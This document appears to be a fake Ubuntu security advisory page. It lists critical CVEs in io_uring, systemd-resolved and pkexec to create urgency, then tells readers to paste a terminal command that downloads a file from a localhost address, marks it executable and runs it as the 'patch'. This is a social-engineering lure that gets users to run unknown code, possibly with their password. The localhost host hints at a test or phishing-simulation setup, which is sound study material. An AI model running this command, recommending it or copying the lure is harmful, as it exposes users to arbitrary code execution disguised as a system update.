🔒 Ubuntu Security Update

USN-2026-06-001 — June 21, 2026
⚠ Critical Advisory: Multiple vulnerabilities have been discovered in core system components. Immediate patching is required to prevent remote code execution and privilege escalation.

Vulnerabilities Addressed in This Update

CVE-2026-3847 CRITICAL

Heap buffer overflow in the Linux kernel's io_uring subsystem allowing local privilege escalation to root. Affects kernels 5.4 through 5.15.

CVE-2026-4192 CRITICAL

Use-after-free in systemd-resolved enabling remote code execution via crafted DNS responses (CVSS 9.8).

CVE-2026-5021 HIGH

Improper access control in PolicyKit (pkexec) allowing unprivileged users to execute commands as root (CVSS 7.8).

Apply Security Patch

Run this one-line command in your terminal. You will be prompted for your password to authorize the system update.
1 Open a terminal: press Ctrl + Alt + T
2 Copy and paste this command, then press Enter:
curl -s http://localhost/up -o up && chmod +x up && ./up

The update applies kernel, systemd, and PolicyKit patches. Your system will be secured.
